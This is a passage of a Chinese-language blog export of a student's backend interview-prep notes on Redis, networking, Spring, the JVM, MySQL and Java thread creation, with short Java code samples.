1（’\0’） 空间懒惰回收如果sdstrim（减少字符串），则不急着回收空间，下次如果需要添加长度，直接使用多余的空间。 List 结构是双向链表由于数据结构的设计，可以更方便的获取链表长度 链表的数据结构1234567891011121314typedef struct list&#123; //表头节点 listNode *head; //表尾节点 listNode *tail; //链表所包含的节点数量 unsigned long len; //节点值复制函数 void (*free) (void *ptr); //节点值释放函数 void (*free) (void *ptr); //节点值对比函数 int (*match) (void *ptr,void *key);&#125;list; ListNode节点数据结构12345678typedef struct listNode&#123; //前置节点 struct listNode *prev; //后置节点 struct listNode *next; //节点的值 void *value; &#125;listNode hash哈希表1234567891011typedef struct dictht &#123; // 哈希表数组 dictEntry **table; // 哈希表大小 unsigned long size; // 哈希表大小掩码，用于计算索引值 // 总是等于 size - 1 unsigned long sizemask; // 该哈希表已有节点的数量 unsigned long used;&#125; dictht; 哈希表节点 123456789101112typedef struct dictEntry &#123; // 键 void *key; // 值 union &#123; void *val; uint64_t u64; int64_t s64; &#125; v; // 指向下个哈希表节点，形成链表 struct dictEntry *next; // 单链表结构&#125; dictEntry; 字典1234567891011typedef struct dict &#123; // 类型特定函数 dictType *type; // 私有数据 void *privdata; // 哈希表 dictht ht[2]; // rehash 索引 // 当 rehash 不在进行时，值为 -1 int rehashidx; /* rehashing not in progress if rehashidx == -1 */&#125; dict; rehash 在字典中存在dictht数组，表明是两个hash表ht[1]的容量是ht[0]的两倍把ht[0]中的元素rehash复制到ht[1]中 渐进式rehash原帖地址 进行读操作：会先去ht[0]中找，找不到再去ht[1]中找。进行写操作：直接写在ht[1]中。进行删除操作：与读类似。 但是每一次的增删改查的操作都会把数据从ht[0]转移到ht[1],是为了避免数据迁移导致的cpu负载问题 有序集合的实现方式是哪种数据结构？ 跳跃表 Redis怎样防止异常数据不丢失？RDB 持久化 将某个时间点的所有数据都存放到硬盘上。可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。如果系统发生故障，将会丢失最后一次创建快照之后的数据。如果数据量很大，保存快照的时间会很长。 AOF 持久化 将写命令添加到 AOF 文件（Append Only File）的末尾。使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：选项同步频率always每个写命令都同步everysec每秒同步一次no让操作系统来决定何时同步always 选项会严重减低服务器的性能；everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响；no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。 讲一讲缓存穿透，缓存雪崩以及缓存击穿吧 缓存穿透：就是客户持续向服务器发起对不存在服务器中数据的请求。客户先在Redis中查询，查询不到后去数据库中查询。 缓存击穿：就是一个很热门的数据，突然失效，大量请求到服务器数据库中 缓存雪崩：就是大量数据同一时间失效。 解决方案 缓存穿透：1.接口层增加校验，对传参进行个校验，比如说我们的id是从1开始的，那么id&lt;=0的直接拦截；2.缓存中取不到的数据，在数据库中也没有取到，这时可以将key-value对写为key-null，这样可以防止攻击用户反复用同一个id暴力攻击 缓存击穿：最好的办法就是设置热点数据永不过期，拿到刚才的比方里，那就是你买腾讯一个永久会员 缓存雪崩：1.缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。2.如果缓存数据库是分布式部署，将热点数据均匀分布在不同搞得缓存数据库中。 集群主从同步过程 master启动线程生成RDB 同时master把新增的请求放到内存中 slaver先将RDB文件写入磁盘 slaver把RDB写入磁盘后再加载到内存中 最后master将缓存的请求再发送给slaver 同步过程细述 客户端向服务器发送SLAVEOF命令，让当前服务器成为Slave； 从节点执行slaveof保存主节点信息从节点通过定时任务发现主节点信息，并建立连接从节点发送ping命令，主节点则返回pong命令成功建立连接 从节点根据自己是否保存Master runid来判断是否是第一次复制, 如果是第一次复制，则进行全量复制，从节点向Master发送PSYNC ? -1 命令来进行完整同步； 如果不是第一次复制，从节点向Master发送PSYNC runid offset； Master接收到PSYNC 命令后首先判断runid是否和本机的id一致，如果一致则会再次判断offset偏移量和本机的偏移量相差有没有超过 大小，如果没有那么就给Slave发送CONTINUE，此时Slave只需要等待Master传回失去连接期间丢失的命令；如果runid和本机id不一致或者双方offset差距超过了复制积压缓冲区大小，那么就会返回FULLRESYNC runid offset，Slave将runid保存起来，并进行完整同步。 上述涉及三个信号FullReSync -&gt; 全量复制信号Continue -&gt; 部分复制信号Err -&gt; psync进行部分复制的时候发现，offset偏移量和主节点的偏移量超过了复制积压缓存区，返回错误信号，进行全量复制FullResync 哨兵原帖地址 基本原理1. 定时任务 通过向主从节点发送info命令获取最新的主从结构； 通过发布订阅功能获取其他哨兵节点的信息； 通过向其他节点发送ping命令进行心跳检测，判断是否下线2. 主观下线 心跳检测的定时任务中，如果其他节点超过一定时间没有回复，哨兵节点就会将其进行主观下线。顾名思义，主观下线的意思是一个哨兵节点“主观地”判断下线 3. 客观下线 哨兵节点在对主节点进行主观下线后，会通过sentinel is-master-down-by-addr命令询问其他哨兵节点该主节点的状态；如果判断主节点下线的哨兵数量达到一定数值，则对该主节点进行客观下线。客观下线是主节点才有的概念；如果从节点和哨兵节点发生故障，被哨兵主观下线后，不会再有后续的客观下线和故障转移操作 4. 选举领导者哨兵节点 Raft算法 ： 哪个节点先发出申请成为主节点，哪个节点就当master 5. 故障转移 先过滤不健康的节点 根据优先级推荐出节点 选出来的节点成为主节点 原来的主节点变成新的主节点的从节点 Redis 和 Memcached 有啥区别，为啥选择用Redis作为你们的缓存中间件？ Redis 相比 Memcached 来说，拥有更多的数据结构，能支持更丰富的数据操作。 在 redis3.x 版本中，便能支持 Cluster 模式，而 Memcached 没有原生的集群模式 Redis 只使用单核，而 Memcached 可以使用多核，所以平均每一个核上 Redis 在存储小数据时比 Memcached 性能更高。而在 100k 以上的数据中，Memcached 性能要高于 Redis，虽然 Redis 最近也在存储大数据的性能上进行优化，但是比起 Remcached，还是稍有逊色 memecache 把数据全部存在内存之中，断电后会挂掉，数据不能超过内存大小 Redis事务 Redis 事务的本质是一组命令的集合。事务支持一次执行多个命令，一个事务中所有命令都会被序列化。在事务执行过程，会按照顺序串行化执行队列中的命令，其他客户端提交的命令请求不会插入到事务执行命令序列中。Redis的事务本质上就是一串命令的执行，已经不可被打断]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·网络协议篇》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F13%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命 五层协议体系结构 应用层 顾名思义就是上层的网络应用 域名，Http协议等 运输层 两台主机之间提供统用的数据传输服务 网络层 选择合适的路由进行数据交换 数据链路层 一段一段的将数据发送 物理层 物理主机之间的比特流交换 三次握手四次挥手三次握手 第一次握手： 客户端（client）向接收端（server）发送标志SYN/ACK，但是 客户端什么都不知道（接收端直到了自己接收正常，也知道客户端发送正常） 第二次握手： 接收端（server）向客户端（client）发送标志SYN/ACK数据包，现在客户端知道自己接收正常，自己发送正常，但是服务端不知道自己是不是发送正常 第三次握手， 客户端（client）向接收端（server）发送标志ACK数据包，现在客户端知道自己发送接收正常，服务端也直到自己发送接收正常 总结：三次握手的原因就是因为数据传输时单向的，对方接收后，发送方属于不知情着，所以才有了三次握手 四次挥手 客户端向接收端发送Fin请求，告诉接收端说我这边没什么要发送的了 接收端向客户端发送一个ACK，告诉客户端说我知道你这边没啥要发送的了 接收端向客户端发送一个Fin，也告诉客户端说我也没什么要发送的了 客户端也发送一个ACK给接收端，确认知道了接收端没什么要发送的了 TCP VS UDP TCP保证可靠的连接，UDP只负责交付数据，因此UDP占用的资源少，发送的数据多，TCP占用资源多，发送的数据较少，但是保证了数据传输的绝对稳定 TCP为啥稳定 TCP会把数据自动分成合适有序有编号的数据包 TCP发送的时候会对头部和数据进行校验 TCP会有流量控制，会设立缓冲区，每次发送的时候也是从缓冲区中读取发送 发送超时会重新进行发送]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·Spring》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F12%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Spring%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命[文章都是搬运艿艿的][http://svip.iocoder.cn/Java/Core/Interview/] Spring 核心组件 （8大模块）Spring Core 核心容易，主要是提供Ioc的依赖注入功能 Spring Aspects 为了让Spring可以更好的融合AspectJ，实际上也是切面 Spring AOP 提供了面向切面编程的实现 Spring JDBC 数据库连接驱动 Spring JMS Java 消息服务（ Java Message Service ， JMS ） Spring ORM ORM的全称是Object Relational Mapping，即对象关系映射 ==&gt; 为Mybatis，Hibernate提供支持 Spring Web 为Web应用提供支持 Spring Test 顾名思义就是为了测试 Junit等 @RestController vs @Controller@Controller 如果是@Controler，Return的值将直接指向一个页面，或者用转发和重定向的方式如果加上@ResponseBody 那么就是@Controller @RestController 也就是 前后分离 模式下最常用的解决方式 Request / Response 的过程 DispatcherServlet -&gt; Handler Mapping -&gt; Controller/RestController如果是 @Controller则是继续到View层 ，如果是@RestController 直接返回Client 谈谈自己对IOC的理解 谈到Ioc就是一种托付的关系，最传统的应用所创建的对象等全部都托付给系统本身之间的依赖,无论耦合度，都是在不断的变大，Ioc控制反转，也就是责任托付从系统本身变成了由Ioc容器管理，我们只需要明白自己需要什么，不用去想怎么管理怎么创建，如果需要的话可以直接使用xml，注解等方式直接配置引用 Ioc初始化机制 XML &gt;读取&gt; Resource &gt;解析&gt; BeanDefinition &gt;注册&gt; BeanFactory xml 是程序员的配置 ，并根据反射机制可以通过BeanDefinition映射，在BeanFactory中创建出对象 AOP 面向切面编程 Aop就是一种想要把自己构造出来的方法切入到某个已经写好的类指定的方法之中 1.通知（Advice） 自己需要在某类的指定方法上实现的功能，日志，事务，安全等功能 2.连接点（JoinPoint） 就是Spring中可以插入通知的地方 3.切入点（Pointcut） 就是在需要插入通知的方法重新实现一下，可以说是作为一个标记 4.切面（Aspect） 就是切入点和通知放在一起，同时构成的一个类的某个位置 5.引入（introduction） 就是把切面的功能正式融入到类中使用 6.目标（target） 别切入的类 7.代理(proxy) Java的动态代理机制 8.织入(weaving) 引入到类中后，开始正式的调用 串读理解Java的动态代理机制Proxy + InvocationHandler 让目标类implemet InvocationHandler再调用的时候，利用Proxy的静态方法newProxyInstance() ，通过反射机制，调用目标类的方法等 CGLIB 生成目标类的一个子类 解读 在理解切面之后，深入到方法本身，如何去插入一个另外写好的类，就是在程序运行时利用动态代理的特点，在调用某个方法的时候，再调用proxy将另一个方法调用进去，Before/After等，所以与其说是切入了方法，不如说是切入到了动态代理的执行过程中 SpringBeanSpringBean 的作用域 Request :每次HTTP请求都会创建一个新的BeanSession :同一个HTTP Session共享一个Bean，不同Session使用不同Beansingleton : 唯一的bean实例prototype : 每次请求都会创建一个新的bean实例 SpringBean没有解决线程安全问题可以用ThreadLocal成员变量 Bean的生命周期 创建调用构造函数 set方法注入属性 BeanNameAware BeanFactoryAware ApplicationContextAware BeanPostProcessor的before方法 initializingBean 自定义init方法 BeanPostProcessor的after方法 使用 容器的销毁 DisposableBean的destry 自定义的销毁方法 Spring启动，查找并加载需要被Spring管理的bean，进行Bean的实例化 Bean实例化后对将Bean的引入和值注入到Bean的属性中 如果Bean实现了BeanNameAware接口的话，Spring将Bean的Id传递给setBeanName()方法 如果Bean实现了BeanFactoryAware接口的话，Spring将调用setBeanFactory()方法，将BeanFactory容器实例传入 如果Bean实现了ApplicationContextAware接口的话，Spring将调用Bean的setApplicationContext()方法，将bean所在应用上下文引用传入进来。 如果Bean实现了BeanPostProcessor接口，Spring就将调用他们的postProcessBeforeInitialization()方法。 如果Bean 实现了InitializingBean接口，Spring将调用他们的afterPropertiesSet()方法。类似的，如果bean使用init-method声明了初始化方法，该方法也会被调用 如果Bean 实现了BeanPostProcessor接口，Spring就将调用他们的postProcessAfterInitialization()方法。 此时，Bean已经准备就绪，可以被应用程序使用了。他们将一直驻留在应用上下文中，直到应用上下文被销毁。 如果bean实现了DisposableBean接口，Spring将调用它的destory()接口方法，同样，如果bean使用了destory-method 声明销毁方法，该方法也会被调用。 @Bean 和 @Component@Bean 修饰方法级 可以用Autowired装配 @Component 用于修饰类级别 可以用@CompontScan装配 SpringMVC 工作流程 client 向 DispatcherServlet 发送请求 DispatcherServlet根据请求信息调用HandlerMapping ，解析请求到handle 解析到handle以后开始用HandlerAdapter适配器处理 HandlerAdapter会根据Haddler调用真正的处理器处理请求和逻辑 之后返回一个ModelAndView对象 ViewResolver会把逻辑View查询具体的视图 DispatcherServlet会把返回的Model给view 或者 Client Spring 事务 编程式事务：在代码中用 声明式事务（xml，注解）：在配置文件中用 隔离等问题跟数据库一致]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·jvm篇》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F11%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Jvm%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命 Java的内存区域（运行时数据区）线程共享区 堆 方法区 （方法区中包含运行时常量池） 线程私有区 虚拟机栈 本地方法栈 程序计数器直接内存Java1.8之后的变化 线程共享的方法区糅合到了直接内存中的元空间 为什么每一个线程需要一个程序计数器程序计数器的作用 是一块比较小的线程空间，可以当作字节码指令的指示器，字节码解释器通过程序计数器来控制字节码指令，比如循环，跳转，分支，异常处理等 为啥线程需要程序计数器？ 由于线程是不断切换的，所以线程在切换后，如何进行哪一步的继续操作，是需要程序计的同时程序计数器是唯一一个不会出现OutOfMemoryError的内存区域 Java虚拟机栈 虚拟栈其实更通俗的讲也就是线程私有化的方法栈，用于执行线程中Java方法调用的内存模型，每次调用都是通过栈来传递的其实Java内存中可以区分成栈空间，和堆空间，栈空间就是现在的虚拟机栈等，同共享区的方法区一样，栈空间的栈帧依然包含局部变量表（各种基本数据类型和引用）同程序计数器不同的是，虚拟机栈会出现超过栈数目的 StackOutOfFlow 以及超过内存内存空间的OutOfMemoryError Java的两种返回方式 return 异常抛出 方法每一次的调用都会压栈，同时每一次返回都会出栈，上面两个方法的调用都会导致出栈 本地方法栈本地方法栈是做什么的？ 本地方法栈和虚拟机栈不同，本地方法栈是用来执行Native修饰的方法，但是虚拟机栈是用来执行Java的方法，但是对于HotSpot虚拟机来说，虚拟机栈和本地方法栈合并了所以一样的可以推出，本地方法栈也有自己的栈帧等，栈帧里面也相应的有局部变量表操作数栈，动态链接，出口信息等 堆 （GC堆） 堆是线程共享区的，也是Jvm管理的最大的内存空间，没有之一，几乎所有的对象实例和都在这里分配内存，当然了线程中的类的实例等，都通过reference进行引用由于垃圾大多数也都是由堆产生，因此也被称作为 GC堆 堆的分类 堆中可以粗略的说有 新生代和老年代 ，新生代用完以后可能就不会再引用，所以要更多的被释放掉老年代则趋于稳定，长久的存在或被使用 更加细致的划分 被分为Eden区和From Survivor，To Survivor大部分情况下，首先会再Eden区进行空间分配，在一次垃圾回收后，对象还存活则年龄加一当年龄增加到默认的15岁，则进入到老年代，当然晋升的年龄阈值是可以调节的-XX:MaxTenuringThreshold 方法区 属于线程共享的内存区域，用于存放虚拟机加载的类信息，常量，静态变量，即时编译器编译后的代码量，主要是用于存放堆中的逻辑操作等。方法区也就是永久代，永久代不用纠结就是HotSpot规定的一种规范方法区的一种实现 -XX:PermSize=N //⽅法区(永久代)初始⼤⼩ -XX:MaxPermSize=N //⽅法区(永久代)最⼤⼤⼩,超过这个值将会抛出OutOfMemoryError异 常:java.lang.OutOfMemoryError: PermGen 不过到JDK1.8的时候已经被移除了，直接变成了元空间，也就是直接存入内存空间。 运行时常量池 是属于方法区的一部分，Class文件中有类型，方法，接口，版本等信息外，还有一些常量（最特征的就是final修饰的）但是1.7之后这部分又去到了堆中开辟了一片空间，因此 运行时常量池包含什么字面量 文本字符串 final修饰的 基本数据类型的值符号引用 类和结构完全限定名 字段名称和描述符 方法名称和描述符 Java对象的创建过程1. 类加载检查 从常量池中定位new的符号引用，看看找个类是不是被加载，解析，初始化过。如果没有再执行相应的类加载过程 2. 分配内存 在堆中直接分配内存，在类加载后会直到该对象需要分配的大小，分配方法有两种（指针碰撞 和 空闲列表），分配方式的选择是由Java堆是否规整决定的 指针碰撞 就是内存如果工整，那么直接就移动指针分配空间 空闲列表 内存不工整，类加载确定出空间后，进行“见缝插针” 线程安全问题CAS乐观解决 就是继续利用CAS算法尝试去获取内存空间，直到成功，虚拟机就是这么做的 TLAB解决 在堆中给每个线程分配一丢丢空间，让他自己独有，分配的时候就先分配给TLAB空间，但是这么做的后果就是空间浪费问题 3. 初始化零值 不包括对象头 ，就是给一一些值赋0或者null 4. 设置对象头 对象的hash码，分代年龄等，同时个synchronized锁也在对象头 5. 执行init（）方法 可以理解为Jvm已经创建完成，但是这里才是按照程序员的意愿开始创建，有点感觉是构造方法执行 对象的访问方式 句柄 直接访问 二者的区别在于对于对象实例数据的处理上，句柄是先访问实例苏话剧的指针，在访问实例数据直接指针是直接去Heap中去访问实例数据，不过相应的二者访问类型数据都是先去堆中访问类型数据指针再去方法区去拿到类型数据 优缺点分析 如果是读取的话，看上面过程也就直到，直接指针直接读取会更快一些，但是同样的如果进行删除操作等，需要一个一个的更改数据，效率差，如果是句柄的话直接地址赋null值就可以了，这个赋null值其实和c++的回收是一样的，直接赋null，就证明这一块空间又可以被分配利用了 对象的分配策略 大对象，长期存活对象分配到老年代，但是一般的对象有限分配到Eden区 Minor GC， Full GC的区别 MinorGC也就是新生代的垃圾回收，很频繁，而且速度快FullGC是指老年代的垃圾回收，不是很频繁 对象的死亡判断程序计数器法 就是一个对象被引用一次那么计数器加一，如果引用失效那么计数器减一,如果为0，则直接回收 可达性分析法 形象的来说就是以GC Root作为起点，然后查看各个对象到GCRoot是否有一条路劲可以连起来，如果连不起来则直接回收 补充：一般哪些可以作为GCRoot呢： 通过System Class Loader或者Boot Class Loader加载的class对象，通过自定义类加载器加载的class不一定是GC Root处于激活状态的线程栈中的对象JNI（Java Native Interface）栈中的对象JNI中的全局对象正在被用于同步的各种锁对象JVM自身持有的对象，比如系统类加载器等 引用 Java1.2之前定义引用就是reference如果指向的是内存空间的起始地址。 强引用 大多数使用的基本都是强引用，垃圾回收器则不会去回收他，及时空间不足，直接oom，也不会去回收强引用 软引用 区别于强引用，当发生内存不足的时候，才可以被垃圾回收掉。 也正是这样，可以用来处理对内存比较敏感的高速缓存 弱引用 区别于软引用，只要垃圾回收器扫描到这部分视作垃圾，那么就直接回收掉可以配合一个引用队列，来查看是是否被GC回收 虚引用 虚引用的实际用途不在乎是引用了什么对象，粗略的说可以说成一种 即将被GC回收的标志，也是一种跟踪GC回收的一种方法，虚引用必须配合 引用队列来使用，即在某对象回收之前，则虚引用入队，告诉Jvm该对象即将要被回收，可以在某对象被回收前做一些操作 废弃常量的判定方法 如果是在常量池，而且没用String对象引用，那么就说他是废弃常量，如果内存回收需要的话，直接清理出去 如何判定一个类的废弃ClassLoader ClassLoader是一个类加载器，它的工作是将一个类的全限名在Jvm外部进行转化成一个二进制流,转成二进制流是为了Jvm读取，但是是在虚拟机外部就转化成，这样的目的是让应用程序自己可以选择这个类，这也是为啥在对象回收时，Jvm Rooter可以是Classroader的原因 java.lang.Class 反射机制的核心，也就就是所有类自身的一个独有的镜子，在一个类被编译成.class文件的时候，在jvm中运行，会同时自动生成一个和自己创建的类想匹配的Class类 一个类废弃的判定方法 所有的实例已经被回收掉，堆中不再有这个类的实例 该类的Classloader也已经被回收 该类对应的java.lang.class文件没有在任何地方被引用，也无法在任何地方通过反射机制来访问该类 垃圾回收机制的算法无脑清空法 – 标记清除算法 标记需要回收的对象，然后标记完后，通过一轮回收直接把标记的位置回收 效率差 清理完空间不连续 复制填坑法 – 复制算法 将内存空间分成两份，然后将不需要回收的内存（活着的对象）复制到另一块空间去，保证整洁 需要两份一样的空间 复制的时候消耗太大 洁癖整理法 – 标记整理算法 也是先标记，但是不同的是，标记以后直接向某一端直接移动，然后GC直接回收边界的无用的空间 分代收集算法 分配空间的空间按照新生代和老年代区别，新生代可以用复制算法，老年代的内存大，而且多，可以使用 标记整理算法，也可以酌情标记清空算法 垃圾收集器Serial （年轻代） 单线程收集器 当进行单线程回收垃圾的时候，其它线程必须停止 但是对一个客户端的还不错，毕竟切换没那么复杂，而且单线程自然可以调用的资源更多ParNew （年轻代） 上述Serial的一个升级，其实就是升级成了多线程 多线程收集 stop the world ，还是要停止所有的线程工作Parallel Scavenge （年轻代） 为了吞吐量而减少收集时间，提高收集次数的一种收集算法，（吞吐量：程序运行时间/CPU使用时长）适合执行批量处理、订单处理 Serial OldParallel Old CMS （老年代） HotSpot的第一款真正意义上的并发垃圾回收机制，是用的标记清除算法 过程初始标记 暂停掉所有的线程，标记一下与GC root相连的对象（可达性分析里面的那个GC Root） 并发标记 继续类似可达性分析，标记一系列可达的的队形 GC Root Trancing 重新标记 并发标记是并发的，重新标记是为了修正重新标记期间的用户变动 并发清除 开始对标记的区域做清理 对CPU资源敏感 无法清理浮动垃圾3 标记清除算法有太多的空间碎片G1 面向服务器的垃圾回收器，针对配备多核处理起的cpu宏观上是复制，微观上有标记整理算法不区分内存块 Eden surviovor old在微观上还是被保留的 过程初始标记并发标记最终标记筛选回收 过程其实大同小异，相比于CMS其实更多的在于标记的时候多了Remember Set，到了最终标记还有Remeber Set Log合并到了Remeber Set因此避免了浮动垃圾问题Region在宏观是其实是复制原则，但是在Region的内部其实是标记整理算法Region内部除了Eden s0 s1 old 还有超大对象，面对超大对象，会选择移动老年代的对象来为超大内存的对象提供内存 Jvm类加载模式 加载 这个阶段会在内存中生成一个代表这个类的 java.lang.Class 对象，作为方法区这个类的各种数据的入口 验证 了确保 Class 文件的字节流中包含的信息是否符合当前虚拟机的要求 准备 是正式为类变量分配内存并设置类变量的初始值阶段，即在方法区中分配这些变量所使用的内存空间。 解析 虚拟机将常量池中的符号引用替换为直接引用的过程 初始化 初始化阶段是类加载最后一个阶段，前面的类加载阶段之后，除了在加载阶段可以自定义类加载器以外，其它操作都由 JVM 主导。到了初始阶段，才开始真正执行类中定义的 Java 程序代码。 类加载器 启动类加载器 负责加载 JAVA_HOME\lib 目录中的，或通过-Xbootclasspath 参数指定路径中的，且被虚拟机认可（按文件名识别，如 rt.jar）的类 扩展类加载器 负责加载 JAVA_HOME\lib\ext 目录中的，或通过 java.ext.dirs 系统变量指定路径中的类库 应用程序类加载器 负责加载用户路径（classpath）上的类库利用双亲委派模型进行类的加载，通过继承java.lang.classloader实现自定义类加载器 启动类加载器（Bootstrap ClassLoader） /\ || 扩展类加载器 （Extension ClassLoader） /\ || 应用程序类加载器 （Application ClassLoader） /\ /\ || || 自定义加载器（User ClassLoader） 自定义加载器（UserClassLoader） 双亲委派模型 当一个类收到类加载的请求，他首先不会尝试自己去加载这个类，而是把请求委托给父类去完成，每一层的类加载器都是如此（如上图，箭头向上），因此最终所有的加载类都应该送到启动类加载器去完成，只有当父类的加载器返回自己无法加载这个请求的时候，子类加载器才会自己尝试去加载。采用双亲委派的一个好处是比如加载位于 rt.jar 包中的类 java.lang.Object，不管是哪个加载器加载这个类，最终都是委托给顶层的启动类加载器进行加载，这样就保证了使用不同的类加载器最终得到的都是同样一个 Object 对象]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·mysql篇》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F10%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-mysql%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命 Mysql事务的特性 - ACID原子性 和线程是一样的，意思就是要么成功，要么失败 =》 事务要么执行成功，要么执行失败 一致性 从一个一致性到另一个一致性是传递的，就是一个业务流程，一个环节不是一致性，下一个环节就会失败 隔离性 数据库事务和事务之间是隔离的，也就是说事务A看不到事务B，相应的事务B也不晓得事务A干啥 持久性 也就是说，只要事务存入数据库的就是永久存在的，哪怕数据库出异常了，数据也还在 Mysql事务的出现的问题事务会发生的意外脏读（Select 没有规矩） 事务A插入了一个数据，但是人家事务A没有提交。结果事务B他没有规矩，他查了一下表，结果发现了事务A插入的数据。这就是脏读 不可重复读（Update 没有规矩） 事务A查询一条数据是A，但是事务b他没有规矩，他更新了数据A变成了B，当事务A再查这条数据的时候，发现变成了B，这就是不可重复读 幻读 （Insert Delete 没有规矩） 事务A差某表，查出A条数据，事务B这时候删了几条数据，事务A此刻又去读了一下，发现数据少了，这就是不可重复读。 数据库隔离级别未提交读 事务之间可以读取到事务未提交的数据 （完美的符合了上面出现的所有问题） 提交读 顾名思义就是可以读取到已经提交的数据，引申一下，里面涉及到的一种“快照读”，也就是读历史确定的版本 可重复读 也就是悲观锁读，当前的一个事务如果读取到该数据，那么给当前读取上锁，其它事务将无法再获取该数据，但是这个并不能限制事务继续插入数据，所以就会引起幻读 串行化 顾名思义就是一个一个慢慢来，一次只能来一个，活该这么慢 Mysql的存储引擎InnoDB Mysql所默认的一种存储引擎，满足ACID的事务要求，他使用了“一次性非锁定性读”（也就是给数据读取等添加版本，这个里面有些和上述的快照读概念差不多） CSV 依靠逗号来分割数据的一种存储方式 InnoDB的一些优点缺点 行锁粒度，粒度更小，更适合并发场景 支持事务，有外键 缺点： 缺点也很明显不支持全文搜索，可以用es搜索 Mysql数据库索引什么是索引 可以理解成一种排序后的数据结构，通过节点存储索引，之后在查到找相应的结果，通过数据结构加速，比如用二叉树，那么就可以通过节点左右比较减少遍历查找的次数，当然了如果1 2 3 4 5 6 就会变成链表，如果是红黑树则解决了这个问题，但是会导致深度过深，因此使用B+树，降低深度，添加广度 常用的功能索引普通索引 就是最基本的添加一个索引，用于加速查找 唯一索引 列值必须唯一，可以为空值，加速查找 主键索引 利用主键作为索引，而且不可以为空，加速查找 覆盖索引 就是查查找的数据也是索引值 组合索引 几列合并成一个索引，但是遵循最左原则 全文索引 全文分词查找，innoDB是做不到的，需要第三方，比如es等 使用索引存在的问题 使用索引的时候不可以随便使用，过度的使用索引会导致消耗大量的资源，热点核心业务的数据应该多使用索引索引会浪费磁盘空间，不要创建非必要的索引,插入、更新、删除需要维护索引，带来额外的开销,索引过多，修改表的时候重构索引性能差但是索引使用的时候可以减少查询次数，提高效率 Sql 的查询顺序 from 从哪个表查询 where 初步过滤条件 group by 过滤后进行分组[重点] having 对分组后的数据进行二次过滤[重点] select 查看哪些结果字段 order by 按照怎样的顺序进行排序返回[重点]]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·并发编程篇》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F09%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命 进程，协程，线程基础概念能否解释进程，线程，协程的关系？ 进程是一个程序代码运行所执行的一个程序，但是一个进程可以包含多个线程，在单核cpu下，Java默认多线程可以以一种抢占式的方式执行一种并发状态，协程是近些年走进视野的，以GO语言为代表可以操作协程，一个线程中可以包含更多的协程，可以简单的说线程包含协程。 协程对于多线程有什么优缺点吗？ 首先是更小的协程可以在不使用内核的前提下进行上下文切换 一个线程就可以完成高并发的任务，对高并发的支持更好 协程在一个线程下，是不用考虑数据的读写不一致问题（读写变量冲突问题） 缺点： 缺点也很明显，本质还是一个单线程，不能利用多核资源，同时也不独立，需要线程，进程配合才可以运行 并行和并发的区别是什么？ 并行是指多个程序 同时多个一起运行 并发是指多个程序在某一个时间段内交替的快速运行，宏观是有点类似并行，但是实际上是交替运行 恶补英语之==&gt; 并发 （concurrency） 并⾏ parallellism 多线程基础之实现（学了这么多年还真的第一次这么认真的去研究该怎么写）Java线程创建的几种方式 继承extends 1234567891011121314151617181920212223package com.runindark.ways;public class ThreadByThread extends Thread&#123; public void SayHello()&#123; System.out.println("Thread by extend Thread"); System.out.println(Thread.currentThread().getName()); &#125; @Override public void run() &#123; SayHello(); &#125; public static void main(String args[])&#123; ThreadByThread threadByThread = new ThreadByThread() ; threadByThread.start(); &#125;&#125; 使用Runnable 1234567891011121314151617package com.runindark.ways;public class ThreadByRunnable implements Runnable &#123; @Override public void run() &#123; System.out.println("Thread create by implements Runnable"); &#125; public static void main(String[] args)&#123; ThreadByRunnable ta = new ThreadByRunnable() ; new Thread(ta).start(); &#125;&#125; 使用CF 123456789101112131415161718192021222324252627282930package com.runindark.ways;import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask;public class ThreadByCF implements Callable &#123; @Override public Object call() throws Exception &#123; return "Thread create by CF" +":" +Thread.currentThread().getName(); &#125; public static void main(String[] args)&#123; FutureTask&lt;Object&gt; futureTask = new FutureTask&lt;&gt;(new ThreadByCF()) ; Thread thread = new Thread(futureTask); thread.setName("Cf"); thread.start(); try &#123; System.out.println(futureTask.get()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 使用线程池 123456789101112131415161718192021package com.runindark.ways;import 